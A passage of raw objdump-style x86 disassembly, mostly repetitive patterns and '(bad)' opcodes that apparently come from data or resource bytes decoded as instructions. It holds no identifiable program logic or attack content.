  40fc29:	add    BYTE PTR [eax],al
  40fc2b:	add    BYTE PTR [eax],al
  40fc2d:	add    BYTE PTR [eax],al
  40fc2f:	add    BYTE PTR [ebp-0x13559878],ah
  40fc35:	out    0xdf,al
  40fc37:	push   DWORD PTR [edi-0x3b007b60]
  40fc3d:	mov    ah,0xa5
  40fc3f:	(bad)  
  40fc40:	mov    esp,0xbeffacb0
  40fc45:	mov    bl,0xb1
  40fc47:	(bad)  
  40fc48:	mov    edi,0xbfffb2b4
  40fc4d:	mov    ah,0xb2
  40fc4f:	(bad)  
  40fc50:	mov    edi,0xbfffb2b4
  40fc55:	mov    ah,0xb2
  40fc57:	(bad)  
  40fc58:	mov    edi,0xbfffb2b4
  40fc5d:	mov    ah,0xb2
  40fc5f:	(bad)  
  40fc60:	mov    edi,0xbfffb2b4
  40fc65:	mov    ah,0xb2
  40fc67:	(bad)  
  40fc68:	mov    edi,0xbeffb2b4
  40fc6d:	mov    ah,0xb1
  40fc6f:	(bad)  
  40fc70:	mov    esi,0xbeffb1b4
  40fc75:	mov    ah,0xb1
  40fc77:	(bad)  
  40fc78:	mov    esi,0xbeffb1b4
  40fc7d:	mov    ah,0xb1
  40fc7f:	(bad)  
  40fc80:	mov    edx,0xc3ff8fa4
  40fc85:	mov    bl,0xa6
  40fc87:	sub    dh,BYTE PTR [edi+eiz*4+0x6fa2177d]
  40fc8e:	xor    esi,DWORD PTR [edx-0x6b4f3b]
  40fc94:	loope  0x40fc7a
  40fc96:	loop   0x40fc97
  40fc98:	in     eax,0xe9
  40fc9a:	jmp    0xbc22b69e
  40fc9f:	call   FWORD PTR [edi-0x3a]
  40fca2:	(bad)  
  40fca3:	push   DWORD PTR [eax]
  40fca5:	scas   al,BYTE PTR es:[edi]
  40fca6:	xor    al,0xfe
  40fca8:	push   ds
  40fca9:	lahf   
  40fcaa:	and    bh,bh
  40fcac:	push   ds
  40fcad:	cdq    
  40fcae:	and    edi,edi
  40fcb0:	push   0xdcff6ab9
  40fcb5:	out    dx,al
  40fcb6:	fdiv   st(7),st
  40fcb8:	std    
  40fcb9:	std    
  40fcba:	std    
  40fcbb:	push   edi
  40fcbd:	hlt    
  40fcbe:	icebp  
  40fcbf:	jmp    FWORD PTR [ecx-0x71009574]
  40fcc5:	push   0x7439
  40fcca:	add    BYTE PTR [eax],al
  40fccc:	add    BYTE PTR [eax],al
  40fcce:	add    BYTE PTR [eax],al
  40fcd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcd1:	mov    BYTE PTR [edi-0x56],ah
  40fcd4:	mov    ds:0xd8ff6586,eax
  40fcd9:	retf   
  40fcda:	mov    ebp,0xdee0e5ff
  40fcdf:	(bad)  
  40fce0:	mov    esi,0xbfffb1b3
  40fce5:	mov    ah,0xb2
  40fce7:	(bad)  
  40fce8:	mov    edi,0xbfffb2b4
  40fced:	mov    ah,0xb2
  40fcef:	(bad)  
  40fcf0:	mov    edi,0xbfffb2b4
  40fcf5:	mov    ah,0xb2
  40fcf7:	(bad)  
  40fcf8:	mov    edi,0xbfffb2b4
  40fcfd:	mov    ah,0xb2
  40fcff:	(bad)  
  40fd00:	mov    edi,0xbfffb2b4
  40fd05:	mov    ah,0xb2
  40fd07:	(bad)  
  40fd08:	mov    edi,0xbeffb2b4
  40fd0d:	mov    ah,0xb1
  40fd0f:	(bad)  
  40fd10:	mov    esi,0xbeffb1b4
  40fd15:	mov    ah,0xb1
  40fd17:	(bad)  
  40fd18:	mov    esi,0xbeffb1b4
  40fd1d:	mov    ah,0xb1
  40fd1f:	(bad)  
  40fd20:	mov    edx,0xc2ff8fa4
  40fd25:	mov    dl,0xa6
  40fd27:	sub    dh,BYTE PTR [edi+eiz*4+0x7ba9237c]
  40fd2e:	inc    edx
  40fd2f:	loope  0x40fd01
  40fd31:	les    esi,FWORD PTR [edx-0x18181c01]
  40fd37:	jmp    ebx
  40fd39:	out    0xe7,eax
  40fd3b:	(bad)  
  40fd3c:	jnp    0x40fd17
  40fd3e:	jg     0x40fd3f
  40fd40:	inc    esi
  40fd41:	retf   0xff4a
  40fd44:	cmp    DWORD PTR [ebp+edi*1+0x2dac29fe],edi
  40fd4b:	call   FWORD PTR [ebx]
  40fd4d:	sahf   
  40fd4e:	push   ds
  40fd4f:	call   FWORD PTR [edi]
  40fd51:	cdq    
  40fd52:	and    edi,edi
  40fd54:	xchg   esi,eax
  40fd55:	iret   
  40fd56:	cwde   
  40fd57:	(bad)  
  40fd58:	std    
  40fd59:	std    
  40fd5a:	std    
  40fd5b:	(bad)  
  40fd5c:	std    
  40fd5d:	std    
  40fd5e:	std    
  40fd5f:	inc    esp
  40fd61:	mov    bl,0xa0
  40fd63:	dec    DWORD PTR [edi+0xaf3868]
  40fd69:	add    BYTE PTR [eax],al
  40fd6b:	add    BYTE PTR [eax],al
  40fd6d:	add    BYTE PTR [eax],al
  40fd6f:	add    BYTE PTR [eax-0x4e559274],ch
  40fd75:	xchg   esp,eax
  40fd76:	je     0x40fd77
  40fd78:	cli    
  40fd79:	stc    
  40fd7a:	clc    
  40fd7b:	(bad)  
  40fd7c:	jmp    0xc040e367
  40fd81:	mov    ah,0xb2
  40fd83:	(bad)  
  40fd84:	mov    edi,0xbfffb2b4
  40fd89:	mov    ah,0xb2
  40fd8b:	(bad)  
  40fd8c:	mov    edi,0xbfffb2b4
  40fd91:	mov    ah,0xb2
  40fd93:	(bad)  
  40fd94:	mov    edi,0xbfffb2b4
  40fd99:	mov    ah,0xb2
  40fd9b:	(bad)  
  40fd9c:	mov    edi,0xbfffb2b4
  40fda1:	mov    ah,0xb2
  40fda3:	(bad)  
  40fda4:	mov    edi,0xbfffb2b4
  40fda9:	mov    ah,0xb2
  40fdab:	(bad)  
  40fdac:	mov    esi,0xbeffb1b4
  40fdb1:	mov    ah,0xb1
  40fdb3:	(bad)  
  40fdb4:	mov    esi,0xbeffb1b4
  40fdb9:	mov    ah,0xb1
  40fdbb:	(bad)  
  40fdbc:	mov    esi,0xbaffb1b4
  40fdc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdc2:	(bad)  
  40fdc3:	inc    ebp
  40fdc5:	mov    dh,0xaa
  40fdc7:	sub    dh,BYTE PTR [ebp-0x4dd7855b]
  40fdcd:	mov    ebx,DWORD PTR [edx-0xb]
  40fdd0:	fstp   st(4)
  40fdd2:	xlat   BYTE PTR ds:[ebx]
  40fdd3:	jmp    ebx
  40fdd5:	out    0xe7,eax
  40fdd7:	jmp    ebx
  40fdd9:	out    0xe7,eax
  40fddb:	jmp    DWORD PTR [eax-0x2a]
  40fdde:	dec    DWORD PTR fs:[edi-0x2d]
  40fde2:	push   ebx
  40fde3:	inc    DWORD PTR [esi-0x36]
  40fde6:	dec    edx
  40fde7:	(bad)  
  40fde8:	cmp    DWORD PTR [ebp+edi*1+0x2dac29ff],edi
  40fdef:	call   FWORD PTR [edi]
  40fdf1:	sahf   
  40fdf2:	and    edi,edi
  40fdf4:	jae    0x40fdb5
  40fdf6:	jne    0x40fdf7
  40fdf8:	cld    
  40fdf9:	cld    
  40fdfa:	cld    
  40fdfb:	(bad)  
  40fdfc:	std    
  40fdfd:	std    
  40fdfe:	std    
  40fdff:	(bad)  
  40fe00:	fstp   st(3)
  40fe02:	aad    0xff
  40fe04:	nop
  40fe05:	imul   edi,DWORD PTR [eax],0xc8
  40fe0b:	add    BYTE PTR [eax],al
  40fe0d:	add    BYTE PTR [eax],al
  40fe0f:	add    BYTE PTR [esi-0x46557359],bh
  40fe15:	popf   
  40fe16:	jg     0x40fe17
  40fe18:	(bad)  
  40fe19:	(bad)  
  40fe1a:	(bad)  
  40fe1b:	(bad)  
  40fe1c:	jmp    0xc040e407
  40fe21:	mov    ah,0xb2
  40fe23:	(bad)  
  40fe24:	mov    edi,0xbfffb2b4
  40fe29:	mov    ah,0xb2
  40fe2b:	(bad)  
  40fe2c:	mov    edi,0xbfffb2b4
  40fe31:	mov    ah,0xb2
  40fe33:	(bad)  
  40fe34:	mov    edi,0xbfffb2b4
  40fe39:	mov    ah,0xb2
  40fe3b:	(bad)  
  40fe3c:	mov    edi,0xbfffb2b4
  40fe41:	mov    ah,0xb2
  40fe43:	(bad)  
  40fe44:	mov    edi,0xbfffb2b4
  40fe49:	mov    ah,0xb2
  40fe4b:	(bad)  
  40fe4c:	mov    esi,0xbeffb1b4
  40fe51:	mov    ah,0xb1
  40fe53:	(bad)  
  40fe54:	mov    esi,0xbeffb1b4
  40fe59:	mov    ah,0xb1
  40fe5b:	(bad)  
  40fe5c:	mov    esi,0xbaffb1b4
  40fe61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe62:	(bad)  
  40fe63:	inc    edi
  40fe65:	mov    ecx,0xa6b62aac
  40fe6a:	jp     0x40fe91
  40fe6c:	scas   eax,DWORD PTR es:[edi]
  40fe6d:	or     DWORD PTR [ebp-0x17],0xffffffd6
  40fe71:	rol    bl,1
  40fe73:	jmp    ebx
  40fe75:	out    0xe7,eax
  40fe77:	jmp    ebx
  40fe79:	out    0xe7,eax
  40fe7b:	push   DWORD PTR [eax-0x27]
  40fe7e:	je     0x40fe7f
  40fe80:	push   ecx
  40fe81:	aad    0x55
  40fe83:	dec    DWORD PTR [esi-0x2e]
  40fe86:	push   edx
  40fe87:	inc    BYTE PTR [esi-0x36]
  40fe8a:	dec    edx
  40fe8b:	(bad)  
  40fe8c:	cmp    DWORD PTR [ebp+edi*1+0x34ae31ff],edi
  40fe93:	dec    DWORD PTR [ebx-0x5007234]
  40fe99:	sti    
  40fe9a:	sti    
  40fe9b:	(bad)  
  40fe9c:	cld    
  40fe9d:	cld    
  40fe9e:	cld    
  40fe9f:	dec    esi
  40fea1:	ret    
  40fea2:	mov    ah,0xff
  40fea4:	xchg   ecx,eax
  40fea5:	imul   edi,DWORD PTR [eax],0xb9
  40feab:	add    BYTE PTR [eax],al
  40fead:	add    BYTE PTR [eax],al
  40feaf:	add    BYTE PTR [ebp-0x4655745a],bh
  40feb5:	popf   
  40feb6:	jg     0x40feb7
  40feb8:	(bad)  
  40feb9:	(bad)  
  40feba:	(bad)  
  40febb:	(bad)  
  40febc:	jmp    0xc040e4a7
  40fec1:	mov    ah,0xb2
  40fec3:	(bad)  
  40fec4:	mov    edi,0xbfffb2b4
  40fec9:	mov    ah,0xb2
  40fecb:	(bad)  
  40fecc:	mov    edi,0xbfffb2b4
  40fed1:	mov    ah,0xb2
  40fed3:	(bad)  
  40fed4:	mov    edi,0xbfffb2b4
  40fed9:	mov    ah,0xb2
  40fedb:	(bad)  
  40fedc:	mov    edi,0xbfffb2b4
  40fee1:	mov    ah,0xb2
  40fee3:	(bad)  
  40fee4:	mov    edi,0xbfffb2b4
  40fee9:	mov    ah,0xb2
  40feeb:	(bad)  
  40feec:	mov    edi,0xbfffb2b4
  40fef1:	mov    ah,0xb2
  40fef3:	(bad)  
  40fef4:	mov    edi,0xbfffb2b4
  40fef9:	mov    ah,0xb2
  40fefb:	(bad)  
  40fefc:	mov    edi,0xbbffb2b4
  40ff01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff02:	nop
  40ff03:	dec    eax
  40ff05:	mov    ecx,0xa7b62aac
  40ff0a:	jnp    0x40ff28
  40ff0c:	test   eax,0xccc53a77
  40ff11:	mov    esp,0xe6e2ffa4
  40ff16:	in     eax,0xff
  40ff18:	loop   0x40ff00
  40ff1a:	out    0xff,al
  40ff1c:	mov    eax,ds:0x5dffa5de
  40ff21:	(bad)  
  40ff22:	popa   
  40ff23:	(bad)  
  40ff24:	push   eax
  40ff25:	aam    0x54
  40ff27:	dec    BYTE PTR [edi-0x2d]
  40ff2a:	push   ebx
  40ff2b:	inc    DWORD PTR [esi-0x36]
  40ff2e:	dec    edx
  40ff2f:	call   FWORD PTR [esi-0x3a]
  40ff32:	(bad)  
  40ff33:	inc    ecx
  40ff35:	loop   0x40fefa
  40ff37:	push   esi
  40ff39:	idiv   eax
  40ff3b:	(bad)  
  40ff3c:	clc    
  40ff3d:	div    edi
  40ff3f:	push   DWORD PTR [esi-0x6d008163]
  40ff45:	push   0x37
  40ff47:	mov    WORD PTR [eax],es
  40ff49:	add    BYTE PTR [eax],al
  40ff4b:	add    BYTE PTR [eax],al
  40ff4d:	add    BYTE PTR [eax],al
  40ff4f:	add    BYTE PTR [ebp-0x4655745b],bh
  40ff55:	pushf  
  40ff56:	jle    0x40ff57
  40ff58:	(bad)  
  40ff59:	(bad)  
  40ff5a:	(bad)  
  40ff5b:	(bad)  
  40ff5c:	jmp    0xbf40e547
  40ff61:	mov    ah,0xb1
  40ff63:	(bad)  
  40ff64:	mov    esi,0xbeffb1b4
  40ff69:	mov    ah,0xb1
  40ff6b:	(bad)  
  40ff6c:	mov    esi,0xbeffb1b4
  40ff71:	mov    ah,0xb1
  40ff73:	(bad)  
  40ff74:	mov    esi,0xbeffb1b4
  40ff79:	mov    ah,0xb1
  40ff7b:	(bad)  
  40ff7c:	mov    esi,0xbeffb1b4
  40ff81:	mov    ah,0xb1
  40ff83:	(bad)  
  40ff84:	mov    esi,0xbfffb1b4
  40ff89:	mov    ah,0xb2
  40ff8b:	(bad)  
  40ff8c:	mov    esi,0xbefeb1b3
  40ff91:	mov    bl,0xb1
  40ff93:	(bad)  
  40ff94:	mov    esi,0xbefeb1b3
  40ff99:	mov    bl,0xb1
  40ff9b:	(bad)  
  40ff9c:	mov    esi,0xbafeb1b3
  40ffa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffa2:	(bad)  
  40ffa3:	inc    dh
  40ffa5:	mov    dh,0xab
  40ffa7:	sub    dh,BYTE PTR [esi-0x5def8358]
  40ffad:	push   0x26
  40ffaf:	xchg   ebp,eax
  40ffb0:	mov    ebx,0xddfe6f99
  40ffb5:	fcmovnbe st,st(5)
  40ffb7:	jmp    edx
  40ffb9:	out    0xe6,al
  40ffbb:	call   ebp
  40ffbd:	in     eax,0xd9
  40ffbf:	jmp    DWORD PTR [eax+0x70fea4de]
  40ffc5:	fdiv   DWORD PTR [esi+edi*8+0x60]
  40ffc9:	(bad)  
  40ffca:	fs (bad) 
  40ffcc:	jnp    0x40ffa7
  40ffce:	jg     0x40ffcf
  40ffd0:	mov    eax,0xe8ffbbe1
  40ffd5:	out    dx,al
  40ffd6:	jmp    0xe2ff:0xf4f3f2ff
  40ffdd:	fcmovbe st,st(0)
  40ffdf:	call   FWORD PTR [ebp-0x6b01ba8c]
  40ffe5:	imul   esi,DWORD PTR [edi],0x50
	...
  40fff0:	mov    ebp,0xb9aa8ba5
  40fff5:	pushf  
  40fff6:	jle    0x40fff7
  40fff8:	(bad)  
  40fff9:	(bad)  
  40fffa:	(bad)  
  40fffb:	(bad)  
  40fffc:	jmp    0xbf40e5e7
  410001:	mov    ah,0xb1
  410003:	(bad)  
  410004:	mov    esi,0xbeffb1b4
  410009:	mov    ah,0xb1
  41000b:	(bad)  
  41000c:	mov    esi,0xbeffb1b4
  410011:	mov    ah,0xb1
  410013:	(bad)  
  410014:	mov    esi,0xbeffb1b4
  410019:	mov    ah,0xb1
  41001b:	(bad)  
  41001c:	mov    esi,0xbeffb1b4
  410021:	mov    ah,0xb1
  410023:	(bad)  
  410024:	mov    esi,0xbfffb1b4
  410029:	mov    ah,0xb2
  41002b:	(bad)  
  41002c:	mov    esi,0xbefeb1b3
  410031:	mov    bl,0xb1
  410033:	(bad)  
  410034:	mov    esi,0xbefeb1b3
  410039:	mov    bl,0xb1
  41003b:	(bad)  
  41003c:	mov    esi,0xbafeb1b3
  410041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410042:	(bad)  
  410043:	inc    bl
  410045:	mov    bl,0xa6
  410047:	sub    dh,BYTE PTR [ebp-0x5cfe8156]
  41004d:	jno    0x41007e
  41004f:	cmp    BYTE PTR [ecx-0x3c37dc97],ah
  410055:	test   eax,0xe0dffc88
  41005a:	(bad)  
  41005c:	jecxz  0x410045
  41005e:	out    0xff,eax
  410060:	loop   0x410048
  410062:	out    0xfe,al
  410064:	loop   0x41004c
  410066:	out    0xfe,al
  410068:	loop   0x410050
  41006a:	out    0xff,al
  41006c:	loop   0x410054
  41006e:	out    0xff,al
  410070:	in     eax,0xe9
  410072:	call   0xec2de976
  410077:	jmp    edx
  410079:	(bad)  
  41007b:	jmp    FWORD PTR [ecx-0x7005a77c]
  410081:	pop    ebp
  410082:	and    ebp,DWORD PTR [ecx+0x646799a]
	...
  410090:	mov    ebp,0xb9aa8ba6
  410095:	pushf  
  410096:	jle    0x410097
  410098:	(bad)  
  410099:	(bad)  
  41009a:	(bad)  
  41009b:	(bad)  
  41009c:	in     eax,dx
  41009d:	jmp    0xffbe:0xc0c9ffe9
  4100a4:	leave  
  4100a5:	sar    BYTE PTR [esi-0x413f3601],0xff
  4100ac:	leave  
  4100ad:	sar    BYTE PTR [esi-0x413f3601],0xff
  4100b4:	leave  
  4100b5:	sar    BYTE PTR [esi-0x413f3601],0xff
  4100bc:	leave  
  4100bd:	sar    BYTE PTR [esi-0x413f3601],0xff
  4100c4:	leave  
  4100c5:	sar    BYTE PTR [esi-0x403f3601],0xff
  4100cc:	leave  
  4100cd:	sar    BYTE PTR [esi-0x413f3602],0xfe
  4100d4:	leave  
  4100d5:	sar    BYTE PTR [esi-0x413f3602],0xfe
  4100dc:	leave  
  4100dd:	sar    BYTE PTR [esi-0x6b574102],0xfe
  4100e4:	ret    
  4100e5:	mov    bl,0xa6
  4100e7:	sub    al,BYTE PTR [eax]
  4100e9:	add    BYTE PTR [eax],al
  4100eb:	add    BYTE PTR [ebp+eiz*4+0x76a30f71],ch
  4100f2:	xor    al,0x6c
  4100f4:	mov    eax,ds:0xc3d92369
  4100f9:	test   eax,0xdbddfc88
  4100fe:	aad    0xff
  410100:	loop   0x4100e8
  410102:	in     eax,0xfe
  410104:	loop   0x4100ec
  410106:	out    0xfe,al
  410108:	loop   0x4100f0
  41010a:	out    0xff,al
  41010c:	loop   0x4100f4
  41010e:	out    0xff,al
  410110:	loope  0x4100f6
  410112:	loop   0x410113
  410114:	xlat   BYTE PTR ds:[ebx]
  410115:	iret   
  410116:	ret    0xafff
  410119:	mov    WORD PTR [ecx-0x9],fs
  41011c:	xchg   esp,eax
  41011d:	pusha  
  41011e:	and    eax,edx
  410120:	cdq    
  410121:	ja     0x410163
  410123:	inc    edx
	...
  410130:	mov    ebp,0xb9aa8ba6
  410135:	pushf  
  410136:	jle    0x410137
  410138:	(bad)  
  410139:	(bad)  
  41013a:	(bad)  
  41013b:	(bad)  
  41013c:	(bad)  
  41013d:	(bad)  
  41013e:	(bad)  
  41013f:	(bad)  
  410140:	(bad)  
  410141:	(bad)  
  410142:	(bad)  
  410143:	(bad)  
  410144:	(bad)  
  410145:	(bad)  
  410146:	(bad)  
  410147:	(bad)  
  410148:	(bad)  
  410149:	(bad)  
  41014a:	(bad)  
  41014b:	(bad)  
  41014c:	(bad)  
  41014d:	(bad)  
  41014e:	(bad)  
  41014f:	(bad)  
  410150:	(bad)  
  410151:	(bad)  
  410152:	(bad)  
  410153:	(bad)  
  410154:	(bad)  
  410155:	(bad)  
  410156:	(bad)  
  410157:	(bad)  
  410158:	(bad)  
  410159:	(bad)  
  41015a:	(bad)  
  41015b:	(bad)  
  41015c:	(bad)  
  41015d:	(bad)  
  41015e:	(bad)  
  41015f:	(bad)  
  410160:	(bad)  
  410161:	(bad)  
  410162:	(bad)  
  410163:	(bad)  
  410164:	(bad)  
  410165:	(bad)  
  410166:	(bad)  
  410167:	(bad)  
  410168:	(bad)  
  410169:	(bad)  
  41016a:	(bad)  
  41016b:	(bad)  
  41016c:	(bad)  
  41016d:	(bad)  
  41016e:	(bad)  
  41016f:	(bad)  
  410170:	(bad)  
  410171:	(bad)  
  410172:	(bad)  
  410173:	(bad)  
  410174:	(bad)  
  410175:	(bad)  
  410176:	(bad)  
  410177:	(bad)  
  410178:	(bad)  
  410179:	(bad)  
  41017a:	(bad)  
  41017b:	(bad)  
  41017c:	(bad)  
  41017d:	(bad)  
  41017e:	(bad)  
  41017f:	(bad)  
  410180:	sar    BYTE PTR [ebp-0x4c3c0157],1
  410186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410187:	sub    al,BYTE PTR [eax]
  410189:	add    BYTE PTR [eax],al
  41018b:	add    BYTE PTR [eax],al
  41018d:	add    BYTE PTR [eax],al
  41018f:	add    BYTE PTR [edx-0x5ce9925b],ch
  410195:	jbe    0x4101cb
  410197:	ins    BYTE PTR es:[edi],dx
  410198:	mov    eax,ds:0xbac82369
  41019d:	cwde   
  41019e:	ins    DWORD PTR es:[edi],dx
  41019f:	dec    edx
  4101a1:	mov    bh,0x9c
  4101a3:	(bad)  
  4101a4:	(bad)  
  4101a5:	iret   
  4101a6:	ret    
  4101a7:	(bad)  
  4101a8:	(bad)  
  4101aa:	aad    0xff
  4101ac:	rol    ah,1
  4101ae:	mov    dl,0xff
  4101b0:	shr    DWORD PTR [ecx-0x7d540076],0x50
  4101b7:	lock cwde 
  4101b9:	arpl   WORD PTR [ebx],sp
  4101bb:	mov    al,0x9b
  4101bd:	jge    0x410203
  4101bf:	dec    esp
  4101c0:	stos   DWORD PTR es:[edi],eax
  4101c1:	scas   al,BYTE PTR es:[edi]
  4101c2:	add    BYTE PTR [edi],0x0
	...
  4101cd:	add    BYTE PTR [eax],al
  4101cf:	add    BYTE PTR [ebp-0x4655745a],bh
  4101d5:	pushf  
  4101d6:	jle    0x4101d7
  4101d8:	fcmovne st,st(5)
  4101da:	mov    esi,0xbecddbff
  4101df:	(bad)  
  4101e0:	fcmovne st,st(5)
  4101e2:	mov    esi,0xbecddbff
  4101e7:	(bad)  
  4101e8:	fcmovne st,st(5)
  4101ea:	mov    esi,0xbecddbff
  4101ef:	(bad)  
  4101f0:	fcmovne st,st(5)
  4101f2:	mov    esi,0xbecddbff
  4101f7:	(bad)  
  4101f8:	fcmovne st,st(5)
  4101fa:	mov    esi,0xbecddbff
  4101ff:	(bad)  
  410200:	fcmovne st,st(5)
  410202:	mov    esi,0xbecddbff
  410207:	(bad)  
  410208:	fmul   st(6),st
  41020a:	mov    edi,0xbecddbff
  41020f:	(bad)  
  410210:	fcmovne st,st(5)
  410212:	mov    esi,0xbecddbfe
  410217:	(bad)  
  410218:	fcmovne st,st(5)
  41021a:	mov    esi,0xbecddbfe
  41021f:	inc    ah
  410221:	lods   eax,DWORD PTR ds:[esi]
  410222:	xchg   esp,eax
  410223:	inc    ah
  410225:	mov    ah,0xa7
  410227:	sub    al,BYTE PTR [eax]
	...
  410231:	add    BYTE PTR [eax],al
  410233:	add    BYTE PTR [edx-0x5cf08f59],ch
  410239:	jno    0x410269
  41023b:	cmp    BYTE PTR [edx-0x586ada96],ah
  410241:	jae    0x410277
  410243:	lds    ebp,FWORD PTR [edi-0x4d16b27d]
  410249:	mov    bl,BYTE PTR [ecx-0xb]
  41024c:	test   eax,0xa0e1417b
  410251:	imul   ebp,DWORD PTR [edx+esi*4],0xffffff9b
  410255:	and    esi,DWORD PTR fs:[ebx-0x61]
  410259:	jg     0x4102a0
  41025b:	sub    ebp,DWORD PTR [eax+0x77aab]
	...
  41026d:	add    BYTE PTR [eax],al
  41026f:	add    BYTE PTR [ebp-0x4655755b],bh
  410275:	pushf  
  410276:	jle    0x410277
  410278:	mov    ecx,0xb9ff7e9c
  41027d:	pushf  
  41027e:	jle    0x41027f
  410280:	mov    ecx,0xb9ff7e9c
  410285:	pushf  
  410286:	jle    0x410287
  410288:	mov    ecx,0xb9ff7e9c
  41028d:	pushf  
  41028e:	jle    0x41028f
  410290:	mov    ecx,0xb9ff7e9c
  410295:	pushf  
  410296:	jle    0x410297
  410298:	mov    ecx,0xb9ff7e9c
  41029d:	pushf  
  41029e:	jle    0x41029f
  4102a0:	mov    ecx,0xb9ff7e9c
  4102a5:	pushf  
  4102a6:	jle    0x4102a7
  4102a8:	mov    ecx,0xb8ff7f9d
  4102ad:	pushf  
  4102ae:	jle    0x4102ae
  4102b0:	mov    eax,0xb8fe7e9c
  4102b5:	pushf  
  4102b6:	jle    0x4102b6
  4102b8:	mov    eax,0xb8fe7e9c
  4102bd:	pushf  
  4102be:	jle    0x4102be
  4102c0:	mov    eax,0xc5fe7e9c
  4102c5:	mov    ch,0xa7
  4102c7:	sub    al,BYTE PTR [eax]
	...
  4102d5:	add    BYTE PTR [eax],al
  4102d7:	add    BYTE PTR [ebp-0x51fe8655],ch
  4102dd:	stos   BYTE PTR es:[edi],al
  4102de:	jns    0x4102f0
  4102e0:	mov    cl,0xaa
  4102e2:	jp     0x410300
  4102e4:	mov    cl,0xaa
  4102e6:	jp     0x41030c
  4102e8:	mov    cl,0xa9
  4102ea:	jnp    0x410313
  4102ec:	mov    al,0xa8
  4102ee:	jp     0x410312
  4102f0:	scas   eax,DWORD PTR es:[edi]
  4102f1:	test   eax,0xaaad177b
  4102f6:	jnp    0x410302
	...
  410310:	(bad)  
  410311:	mov    dl,0x9c
  410313:	sbb    al,0xc5
  410315:	mov    al,0x9b
  410317:	sub    al,dh
  410319:	mov    cl,0x9f
  41031b:	sub    al,bh
  41031d:	mov    ah,0xa3
  41031f:	sub    cl,cl
  410321:	mov    ecx,0xbacb2aa9
  410326:	stos   DWORD PTR es:[edi],eax
  410327:	sub    cl,bl
  410329:	mov    edx,0xbbca2aab
  41032e:	lods   eax,DWORD PTR ds:[esi]
  41032f:	sub    cl,ah
  410331:	mov    ebp,0xbdcc2ab0
  410336:	mov    cl,0x2a
  410338:	retf   0xaebb
  41033b:	sub    cl,cl
  41033d:	mov    edx,0xbac92aae
  410342:	scas   al,BYTE PTR es:[edi]
  410343:	sub    cl,cl
  410345:	mov    edx,0xb9c92aae
  41034a:	lods   al,BYTE PTR ds:[esi]
  41034b:	sub    cl,al
  41034d:	mov    eax,0xb8c82aab
  410352:	stos   DWORD PTR es:[edi],eax
  410353:	sub    al,bh
  410355:	mov    eax,0xb8c72aaa
  41035a:	stos   BYTE PTR es:[edi],al
  41035b:	sub    al,bh
  41035d:	mov    bh,0xa9
  41035f:	sub    al,bh
  410361:	mov    bh,0xa9
  410363:	sub    cl,cl
  410365:	mov    edx,0xffff07af
  41036a:	push   eax
  41036c:	aas    
  41036d:	add    BYTE PTR [eax],al
  41036f:	add    bh,bh
  410371:	(bad)  
  410372:	jmp    eax
  410374:	aas    
  410375:	add    BYTE PTR [eax],al
  410377:	add    bh,bh
  410379:	(bad)  
  41037a:	jmp    eax
  41037c:	aas    
  41037d:	add    BYTE PTR [eax],al
  41037f:	add    bh,bh
  410381:	(bad)  
  410382:	inc    eax
  410384:	aas    
  410385:	add    BYTE PTR [eax],al
  410387:	add    bh,bh
  410389:	(bad)  
  41038a:	inc    eax
  41038c:	aas    
  41038d:	add    BYTE PTR [eax],al
  41038f:	add    al,ah
  410391:	add    edi,edi
  410393:	cmp    BYTE PTR [edi+0x0],0x0
  410397:	add    al,al
  410399:	add    edi,ecx
  41039b:	cmp    BYTE PTR [edi+0x0],0x0
  41039f:	add    BYTE PTR [eax-0x7f34ff],al
  4103a5:	add    BYTE PTR [eax],al
  4103a7:	add    BYTE PTR [eax],al
  4103a9:	add    cl,al
  4103ab:	add    bh,bh
  4103ad:	add    BYTE PTR [eax],al
  4103af:	add    BYTE PTR [eax],al
  4103b1:	add    bl,al
  4103b3:	add    edi,edi
  4103b5:	add    BYTE PTR [eax],al
  4103b7:	add    BYTE PTR [eax],al
  4103b9:	add    al,al
  4103bb:	add    edi,edi
  4103bd:	add    BYTE PTR [eax],al
  4103bf:	add    BYTE PTR [eax],al
  4103c1:	add    al,al
  4103c3:	add    edi,edi
  4103c5:	add    BYTE PTR [eax],al
  4103c7:	add    BYTE PTR [eax],al
  4103c9:	add    al,al
  4103cb:	add    edi,edi
  4103cd:	add    BYTE PTR [eax],al
  4103cf:	add    BYTE PTR [eax],al
  4103d1:	add    al,al
  4103d3:	add    BYTE PTR [edi],cl
  4103d5:	add    BYTE PTR [eax],al
  4103d7:	add    BYTE PTR [eax],al
  4103d9:	add    al,al
  4103db:	add    BYTE PTR [edi],cl
  4103dd:	add    BYTE PTR [eax],al
  4103df:	add    BYTE PTR [eax],al
  4103e1:	add    al,al
  4103e3:	add    BYTE PTR [edi],cl
  4103e5:	add    BYTE PTR [eax],al
  4103e7:	add    BYTE PTR [eax],al
  4103e9:	add    al,al
  4103eb:	add    BYTE PTR [edi],bl
  4103ed:	add    BYTE PTR [eax],al
  4103ef:	add    BYTE PTR [eax+0x3f00c001],al
  4103f5:	add    BYTE PTR [eax],al
  4103f7:	add    al,al
  4103f9:	add    eax,eax
  4103fb:	add    BYTE PTR [edi+0x0],bh
  4103fe:	add    BYTE PTR [eax],al
  410400:	loopne 0x410405
  410402:	rol    BYTE PTR [eax],0xff
  410405:	add    BYTE PTR [eax],al
  410407:	add    bh,bh
  410409:	inc    eax
  41040b:	add    edi,edi
  41040d:	add    BYTE PTR [eax],al
  41040f:	add    bh,bh
  410411:	inc    eax
  410413:	add    edi,edi
  410415:	add    BYTE PTR [eax],al
  410417:	add    bh,bh
  410419:	inc    eax
  41041b:	pop    es
  41041c:	inc    DWORD PTR [eax]
  41041e:	add    BYTE PTR [eax],al
  410420:	(bad)  
  410421:	inc    eax
  410423:	ud0    eax,DWORD PTR [eax]
  410426:	add    BYTE PTR [eax],al
  410428:	lock pop es
  41042a:	rol    BYTE PTR [eax],0x0
  41042d:	add    BYTE PTR [eax],al
  41042f:	add    al,al
  410431:	add    eax,eax
  410433:	add    BYTE PTR [eax],al
  410435:	add    BYTE PTR [eax],al
  410437:	add    BYTE PTR [eax+0xc001],al
  41043d:	add    BYTE PTR [eax],al
